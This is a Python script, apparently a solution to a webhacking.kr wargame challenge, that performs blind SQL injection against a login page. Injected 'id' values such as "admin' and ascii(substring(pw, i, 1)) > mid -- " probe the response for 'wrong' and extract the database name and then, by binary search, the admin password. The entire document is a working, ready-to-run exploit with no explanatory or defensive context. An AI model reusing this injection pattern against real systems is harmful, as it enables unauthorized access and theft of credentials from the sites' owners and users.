import requests
import string
from tqdm import tqdm

url = 'https://webhacking.kr/challenge/bonus-1/index.php'

db_length = 0 # 10
db_name = '' # webhacking
pw_length = 0
tc = string.ascii_letters + string.digits + string.punctuation

# Database Length
i = 0
while True:
    # guest' and length(database()) = i#
    payload = f'guest\' and length(database()) = {i} -- '
    param = {'id' : payload, 'pw' : '1'}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('wrong'):
        db_length = i
        break
    i += 1
print(f':::: DB Length :::: {db_length}')

# Database Name
db_name = ''
for i in tqdm(range(1, db_length + 1)):
    for ch in tc:
        # guest' and j = ascii(substring(db_name(), i, 1))
        payload = f'guest\' and ascii(substring(database(), {i}, 1)) = {ord(ch)} -- '
        param = {'id' : payload, 'pw' : '1'}
        r = requests.get(url, params = param)
        
        if r.text.__contains__('wrong'):
            db_name += ch
            break
print(f':::: DATABASE NAME :::: {db_name}')


# Get Password Length
pw_length = 0
for i in tqdm(range(100)):
    # guest' and length(pw) = i
    payload = f'admin\' and length(pw) = {i} -- '
    param = {'id' : payload, 'pw' : '1'}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('wrong'):
        pw_length = i
        break

print(f':::: PASSWORD :::: {pw_length}')  

# Admin Password Binary search
pw = ''
for i in tqdm(range(1, pw_length + 1)):
    left, right = 32, 127

    while True:
        mid = int((left + right) / 2)
        # admin' and ascii(substring(pw(), i, 1)) > ascii mid value
        payload = f'admin\' and ascii(substring(pw, {i}, 1)) > {mid} -- '
        param = {'id' : payload, 'pw' : '1'}
        r = requests.get(url, params = param)
        
        if r.text.__contains__('wrong'):
            left = mid
            if (left + 1 == right):
                pw += chr(mid + 1)
                break
        else:
            right = mid

print(f':::: ADMIN PASSWORD :::: {pw}')